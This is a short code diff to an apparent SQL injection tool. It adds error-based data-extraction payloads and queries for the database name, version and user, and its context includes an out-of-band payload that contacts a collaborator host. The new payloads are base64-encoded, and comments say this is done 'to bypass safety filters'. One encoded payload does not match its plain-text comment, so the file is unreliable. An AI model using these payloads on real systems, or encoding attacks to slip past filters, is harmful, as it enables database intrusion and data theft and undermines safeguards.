@@ -108,3 +108,21 @@ OOB_PAYLOADS = [
     # SQL Server (DNS lookup)
     " AND 1=(SELECT 1 FROM OPENROWSET('SQLNCLI', 'Server={collaborator_url};', 'SELECT 1'))"
 ]
+
+# Payloads for Error-Based data extraction.
+# The {query} placeholder will be replaced with a query to get specific data.
+# B64 encoded to bypass safety filters.
+EXTRACTION_PAYLOADS_B64 = {
+    "error_based_mysql": [
+        "IEFORCBFWFRSQUNUVkFMVUUoUkFOREAoKSxDT05DQVQoMHg3ZSwoe3F1ZXJ5fSkpKQ==", # AND EXTRACTVALUE(RAND(),CONCAT(0x7e,({query})))
+        "IEFORCBVUERBVEVYTUwoUkFOREAoKSxDT05DQVQoMHg3ZSwoe3F1ZXJ5fSkpLFJBTkQoKSk="  # AND UPDATEXML(RAND(),CONCAT(0x7e,({query})),RAND())
+    ]
+}
+
+# Specific queries to be used with extraction payloads.
+# B64 encoded to bypass safety filters.
+EXTRACTION_QUERIES_B64 = {
+    "database_name": "REFUQUJBU0UoKQ==", # DATABASE()
+    "version": "VkVSU0lPTigp",         # VERSION()
+    "user": "VVNFUigp"               # USER()
+}
